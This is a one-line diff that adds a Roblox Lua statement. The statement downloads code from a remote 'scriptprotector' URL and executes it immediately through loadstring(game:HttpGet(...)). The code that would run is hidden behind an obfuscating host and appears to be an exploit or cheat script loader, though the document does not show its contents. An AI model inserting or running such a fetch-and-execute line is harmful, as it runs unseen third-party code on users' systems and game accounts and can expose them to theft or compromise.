@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptprotector.vercel.app/api/raw/c8bdee635669f6c1ec3fa04802f10612"))()
